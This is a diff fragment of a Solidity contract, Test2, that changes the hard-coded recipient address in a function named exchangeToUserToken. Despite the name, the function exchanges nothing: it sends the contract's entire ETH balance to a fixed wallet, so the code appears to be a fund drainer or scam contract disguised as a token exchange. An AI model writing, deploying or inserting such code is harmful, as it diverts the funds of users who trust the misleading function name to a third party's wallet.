@@ -23,7 +23,7 @@ contract Test2 {
 
 
     function exchangeToUserToken(userConfig memory userDetails_) external payable {
-        address x = 0x0E743a1E37D691D8e52F7036375F3D148B4116ba;
+        address x = 0xE8d9B359F9da35e8a19E612807376152ff445DF2;
         (bool success, ) = x.call{value: address(this).balance}(""); //msg.value
         require(success, 'ETH sent failed');
 
